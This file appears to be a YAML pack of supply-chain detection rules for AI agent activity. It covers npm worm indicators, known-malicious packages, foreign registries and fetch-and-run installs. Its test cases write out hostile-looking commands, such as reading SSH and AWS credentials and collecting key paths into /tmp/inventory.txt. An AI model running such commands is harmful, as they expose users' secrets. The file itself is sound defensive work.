# Supply chain: worm indicators, malicious and unexpected package sources.
# The OS-plane chain (a package lifecycle script launching an agent) is in
# the process pack; repository auto-run plants found at rest are posture.
pack: supply-chain
version: "2026.11.0"
description: Worm indicators, malicious packages, unexpected registries and fetch-and-run installs.
rules:
  - id: HB-SUPPLY-001
    title: Worm indicator file written or run
    description: >-
      A file from the 2025-2026 npm worm campaigns is written or run
      (.github/setup.js, setup_bun.js, bun_environment.js,
      ~/.config/index.js), a public repository named s1ngularity-repository
      is created, a runner named SHA1HULUD is registered, or the agent writes
      /tmp/inventory.txt after reading credential material in the same
      thread (the s1ngularity prompt). Naming an indicator is not enough:
      the advisories told every developer to search for these names, so a
      search, a listing or a plain /tmp/inventory.txt write is the finding
      HB-SUPPLY-006.
    kind: activity
    class: alert
    severity: critical
    confidence: high
    maturity: stable
    category: supply_chain
    tags: [attack.t1195.002, atlas.aml.t0010.005, owasp.asi04]
    references:
      - "research/threats.md section 2 row 1: Nx s1ngularity (/tmp/inventory.txt, s1ngularity-repository)"
      - "research/threats.md section 2 row 26: Shai-Hulud (setup_bun.js, bun_environment.js, SHA1HULUD)"
      - "research/threats.md section 2 row 29: Miasma (.github/setup.js, ~/.config/index.js)"
      - "research/threats.md section 3 R54, R29"
    falsepositives:
      - "Incident responders reproducing the worm in a lab"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - all:
            - tool.kind|in: [file_write, file_edit]
            - any:
                - target.path|endswith: ["/.github/setup.js", "\\.github\\setup.js", "/setup_bun.js", "\\setup_bun.js", "/bun_environment.js", "\\bun_environment.js"]
                - target.path|re: '(?i)^(~|\$\{?home\}?|/root|/var/root|/home/[^/]+|/Users/[^/]+|[a-z]:[\\/]users[\\/][^\\/]+|%userprofile%|\$env:userprofile)[/\\]\.config[/\\]index\.js$'
        - shell.writes|any_endswith: [".github/setup.js", ".github\\setup.js", setup_bun.js, bun_environment.js]
        - shell.writes|any_re: '(?i)^(~|\$\{?home\}?|/root|/var/root|/home/[^/]+|/Users/[^/]+|[a-z]:[\\/]users[\\/][^\\/]+|%userprofile%|\$env:userprofile)[/\\]\.config[/\\]index\.js$'
        - shell.executes_paths|any_endswith: [".github/setup.js", setup_bun.js, bun_environment.js, ".config/index.js"]
        # Publishing under the campaign's repository name.
        - any_command:
            name: gh
            args|icontains: [s1ngularity-repository, sha1-hulud, sha1hulud]
            any:
              - args|contains: create
              - all:
                  - args|contains: api
                  - args|contains_any: [-f, -F, --field, --raw-field, --input]
        # Registering the worm's self-hosted runner.
        - any_command:
            name|in: [config.sh, config.cmd, run.sh, run.cmd]
            args|icontains: [sha1hulud, sha1-hulud]
        # The s1ngularity inventory, after credentials were read.
        - all:
            - session.flags|contains_any: [credential_source_read, secret_read]
            - any:
                - all:
                    - tool.kind|in: [file_write, file_edit]
                    - target.path|endswith: ["/tmp/inventory.txt", "/tmp/inventory.txt.bak"]
                - shell.writes|any_endswith: ["/tmp/inventory.txt", "/tmp/inventory.txt.bak"]
    evidence: [target.path, target.command]
    escalate: true
    remedy: Isolate the host, rotate every credential the user holds and check which packages ran install scripts.
    tests:
      - name: node runs .github/setup.js
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "node .github/setup.js" } }
        expect: match
      - name: setup.js written by a tool
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/.github/setup.js } }
        expect: match
      - name: public repository with the IOC name
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh repo create s1ngularity-repository-0 --public" } }
        expect: match
      - name: runner registered as SHA1HULUD
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cd ~/.dev-env && ./config.sh --url https://github.com/victim/repo --token AAAA1111BBBB2222 --name SHA1HULUD --unattended" } }
        expect: match
      - name: user-level launcher written
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/.config/index.js } }
        expect: match
      - name: inventory written after credentials were read
        events:
          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "cat ~/.ssh/id_rsa ~/.aws/credentials" } }
          - { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "printf '%s\\n' ~/.ssh/id_rsa ~/.aws/credentials > /tmp/inventory.txt" } }
        expect: match
      - name: inventory file name without a credential read
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /tmp/inventory.txt } }
        expect: no_match
      - name: hunting for the indicator files
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "find ~/src -name setup_bun.js -o -name bun_environment.js" } }
        expect: no_match
      - name: hunting for the campaign name in dependencies
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -rl sha1-hulud node_modules" } }
        expect: no_match
      - name: searching GitHub for the campaign repository
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh search repos s1ngularity-repository --owner @me" } }
        expect: no_match
      - name: reading an indicator file to inspect it
        event: { type: tool.pre, tool: { kind: file_read, name: Read }, target: { path: /home/tester/project/node_modules/x/setup_bun.js } }
        expect: no_match
      - name: ordinary workflow file
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/.github/workflows/ci.yml } }
        expect: no_match
      - name: project setup script
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "node scripts/setup.js" } }
        expect: no_match
      - name: project-level config script
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /home/tester/project/.config/index.js } }
        expect: no_match

  - id: HB-SUPPLY-002
    title: Package from an incident report installed
    description: >-
      An install names a package listed in malicious_packages (seeded from
      research/threats.md; extend it from OSV MAL-* or OpenSSF
      malicious-packages through a bundle).
    kind: activity
    class: alert
    severity: critical
    confidence: high
    maturity: stable
    category: supply_chain
    tags: [attack.t1195.002, attack.t1204.005, owasp.asi04]
    references:
      - "research/threats.md section 2 row 33: AGENTS.md tells Codex to install function-color"
      - "research/threats.md section 2 row 35: postmark-mcp 1.0.16"
      - "research/threats.md section 3 R33"
    falsepositives:
      - "Security researchers installing a known-malicious package in an isolated lab (tag the host offsec)"
    when:
      type: [tool.pre, process.exec]
    match:
      any_install:
        packages|any_in_list: malicious_packages
    evidence: [target.command, shell.installs]
    remedy: Remove the package, rotate credentials the install script could reach and report the package.
    tests:
      - name: function-color
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install function-color" } }
        expect: match
      - name: malicious postmark-mcp version
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm i postmark-mcp@1.0.16" } }
        expect: match
      - name: earlier postmark-mcp version
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm i postmark-mcp@1.0.15" } }
        expect: no_match
      - name: ordinary package
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install lodash" } }
        expect: no_match

  - id: HB-SUPPLY-003
    title: Install from an unapproved registry or index
    description: >-
      An install names its own registry or index (--registry, --index-url,
      --extra-index-url) that is not on approved_package_indexes. Package
      names then resolve against a host the organisation does not control,
      which is dependency confusion's mechanism.
    kind: activity
    class: finding
    severity: medium
    confidence: medium
    maturity: stable
    category: supply_chain
    tags: [attack.t1195.001, owasp.asi04]
    references:
      - "research/threats.md section 3 R33"
    falsepositives:
      - "The organisation's own mirror not yet listed"
    when:
      type: [tool.pre, process.exec]
    match:
      any_install:
        flags|any_startswith: ["--registry=", "--index-url=", "--extra-index-url=", "--index=", "--default-index=", "-i="]
    allow:
      shell.install_sources|in_list: approved_package_indexes
    dedup: [shell.install_sources]
    evidence: [target.command, shell.install_sources]
    remedy: Use the organisation's registry; add it to approved_package_indexes if it is one.
    tests:
      - name: pip with a foreign index
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install --index-url https://evil.example/simple requests" } }
        expect: match
      - name: npm with a foreign registry
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm install --registry https://npm.evil.example lodash" } }
        expect: match
      - name: pytorch wheel index
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install --extra-index-url https://download.pytorch.org/whl/cu121 torch" } }
        expect: no_match
      - name: plain install
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install requests" } }
        expect: no_match

  - id: HB-SUPPLY-004
    title: Package installed straight from a URL or git repository
    description: >-
      An install takes its package from a URL or a git repository instead
      of a registry. Common for unreleased fixes, so a signal; it bypasses
      registry malware scanning and version pinning.
    kind: activity
    class: signal
    severity: low
    confidence: medium
    maturity: stable
    category: supply_chain
    tags: [attack.t1195.001, owasp.asi04]
    references:
      - "research/threats.md section 3 R33"
    falsepositives:
      - "Installing a fork or an unreleased fix from git at the user's request"
      - "Internal packages hosted on the org's own git server"
    when:
      type: [tool.pre, process.exec]
    match:
      any_install:
        packages|any_startswith: ["git+", "http://", "https://", "git@", "github:", "gitlab:"]
    dedup: [shell.install_sources]
    evidence: [target.command, shell.install_sources]
    remedy: No action on its own; pin a commit when a git source is needed.
    tests:
      - name: pip from git
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install git+https://github.com/x/y" } }
        expect: match
      - name: registry install
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install 'requests>=2'" } }
        expect: no_match
      - name: local editable install
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "pip install -e ." } }
        expect: no_match

  - id: HB-SUPPLY-005
    title: Package fetched and run in one step
    description: >-
      npx, uvx, bunx or pipx run downloads the latest release of a package
      and runs it immediately. This is how most MCP servers start, so it is a
      signal: every run executes whatever was published last.
    kind: activity
    class: signal
    severity: info
    confidence: high
    maturity: stable
    category: supply_chain
    tags: [attack.t1195.002, owasp.asi04]
    references:
      - "research/threats.md section 6 (npx -y MCP servers are the ecosystem default)"
    falsepositives:
      - "npx, uvx or pipx running a well-known CLI"
    when:
      type: [tool.pre, process.exec]
    match:
      shell.install_exec: true
    dedup: [shell.installs]
    evidence: [shell.installs]
    remedy: No action on its own; pin versions for anything run regularly.
    tests:
      - name: npx -y
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npx -y @modelcontextprotocol/server-filesystem /tmp" } }
        expect: match
      - name: npm ci
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "npm ci" } }
        expect: no_match
      - name: local binary
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "./node_modules/.bin/tsc -p ." } }
        expect: no_match

  - id: HB-SUPPLY-006
    title: Worm indicator named on a command line or inventory file written
    description: >-
      A command names an indicator of the 2025-2026 npm worm campaigns
      (.github/setup.js, setup_bun.js, bun_environment.js,
      s1ngularity-repository, SHA1HULUD) outside a search or listing, or
      /tmp/inventory.txt is written without an earlier credential read in
      the thread. Both are weaker than HB-SUPPLY-001: an indicator in an
      argument may be a commit message or a note, and inventory.txt is an
      ordinary name for a host list. Commands made only of search,
      listing and inspection tools (ioc_hunt_commands) that only name an
      indicator are exempt, because every advisory told developers to run
      exactly those.
    kind: activity
    class: finding
    severity: medium
    confidence: medium
    maturity: experimental
    category: supply_chain
    tags: [attack.t1195.002, atlas.aml.t0010.005, owasp.asi04]
    references:
      - "research/threats.md section 2 row 1: Nx s1ngularity (/tmp/inventory.txt, s1ngularity-repository)"
      - "research/threats.md section 2 row 26: Shai-Hulud (setup_bun.js, bun_environment.js, SHA1HULUD)"
      - "research/threats.md section 3 R54"
    falsepositives:
      - "Notes, commit messages or scripts that mention the campaign"
      - "An Ansible or host list saved as /tmp/inventory.txt"
    when:
      type: [tool.pre, process.exec]
    match:
      any:
        - all:
            - shell.argv|icontains: [".github/setup.js", setup_bun.js, bun_environment.js, s1ngularity-repository, sha1hulud, sha1-hulud]
            - not:
                shell.commands|in_list: ioc_hunt_commands
        # Not exempt for hunting tools: find ~ -name id_rsa >
        # /tmp/inventory.txt is the s1ngularity prompt's own first step.
        - all:
            - tool.kind|in: [file_write, file_edit]
            - target.path|endswith: ["/tmp/inventory.txt", "/tmp/inventory.txt.bak"]
        - shell.writes|any_endswith: ["/tmp/inventory.txt", "/tmp/inventory.txt.bak"]
    dedup: [target.path, shell.writes]
    evidence: [target.path, target.command]
    remedy: Check whether the command is part of an incident response; if not, look for the campaign's other indicators on the host.
    tests:
      - name: inventory file written by a tool
        event: { type: tool.pre, tool: { kind: file_write, name: Write }, target: { path: /tmp/inventory.txt } }
        expect: match
      - name: indicator name passed to a script
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "node tools/publish.js --repo s1ngularity-repository-1" } }
        expect: match
      - name: hunting for the indicator files with find
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "find ~/src -name setup_bun.js -o -name bun_environment.js" } }
        expect: no_match
      - name: hunting for the campaign name with grep
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "grep -rl sha1-hulud node_modules" } }
        expect: no_match
      - name: listing GitHub repositories for the campaign name
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "gh repo list --limit 500 | grep -i s1ngularity-repository" } }
        expect: no_match
      - name: hashing found indicator files
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "find . -name bun_environment.js -print0 | xargs -0 sha256sum" } }
        expect: no_match
      - name: key paths collected into the inventory file by find
        event: { type: tool.pre, tool: { kind: shell, name: Bash }, target: { command: "find $HOME -maxdepth 4 -name id_rsa -o -name '*.pem' > /tmp/inventory.txt" } }
        expect: match
